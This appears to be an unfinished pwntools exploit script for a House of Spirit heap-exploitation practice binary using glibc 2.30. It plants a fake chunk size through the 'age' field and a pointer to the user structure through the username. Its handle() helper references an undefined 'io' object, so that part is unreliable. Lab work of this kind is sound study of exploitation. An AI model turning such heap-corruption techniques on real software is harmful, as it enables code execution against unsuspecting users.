#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_spirit_patched")
libc = ELF("./libc-2.30.so")
ld = ELF("./ld-2.30.so")

context.binary = exe

p = process()
index = 0

def info(mes):
    return log.info(mes)

def handle():
    global puts
    global heap
    p.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    p.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    info('puts @ ' + hex(puts))
    info("heap @ " + hex(heap))
    return puts, heap
    
def info_user(age, name):
    p.sendafter(b'Enter your age: ', str(age).encode())
    p.sendafter(b'Enter your username: ', name)
    p.recvuntil(b'> ')
    
def malloc(size, data, chunk_name):
    global index
    p.send(b'1')
    p.sendafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)
    p.sendafter(b'chunk name: ', chunk_name)
    p.recvuntil(b'> ')
    index += 1
    return index - 1
    
def free(index):
    p.send(b'2')
    p.sendafter(b'index: ', str(index).encode())
    p.recvuntil(b'> ')


def target():
    p.send(b'3')
    p.recvuntil(b'> ')

def quit():
    p.send(b'4')


p.sendafter(b'age: ',f"{0x61}".encode())

name = b'a'*8 + p64(exe.sym.user+0x10)
chunk_A =  malloc(0x18,b'a'*0x18,name)

p.interactive()



